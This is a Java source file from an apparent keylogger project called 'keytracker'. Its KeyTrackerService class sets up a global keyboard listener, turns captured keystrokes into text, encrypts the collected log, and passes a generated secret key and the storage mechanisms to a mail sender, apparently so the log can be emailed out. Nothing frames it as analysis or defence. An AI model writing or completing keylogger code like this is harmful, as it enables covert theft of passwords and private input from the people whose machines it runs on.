package com.keytracker;

import com.keytracker.encrypt.Encryptor;
import com.keytracker.encrypt.KeyGen;
import com.keytracker.handlers.HandlersProvider;
import com.keytracker.mail.MailSender;
import com.keytracker.storing.StoreMechanism;
import de.ksquared.system.keyboard.KeyListener;

import javax.crypto.SecretKey;
import java.util.List;

public class KeyTrackerService {
    private final KeyListener keyListener;
    private final List<StoreMechanism> storeMechanisms;

    public KeyTrackerService(String[] args) {
        ArgsResolver argsResolver = new ArgsResolver(args);
        MailSender mailSender = new MailSender();
        SecretKey secretKey = new SecretKeyStore(new KeyGen(), mailSender, argsResolver).secretKey();
        KeyAppender keyAppender = new KeyAppender();

        MechanismsFactory mechanismsFactory = new MechanismsFactoryImpl(argsResolver, mailSender);
        this.storeMechanisms = mechanismsFactory.getSingleStoreMechanisms(keyAppender, new Encryptor(secretKey));

        this.keyListener = new KeyListenerImpl(new AsciToStringKeyResolver(new HandlersProvider(new CharactersProvider())), keyAppender);
    }

    public KeyListener getKeyListener() {
        return this.keyListener;
    }


    public List<StoreMechanism> getStoreMechanisms() {
        return storeMechanisms;
    }
}
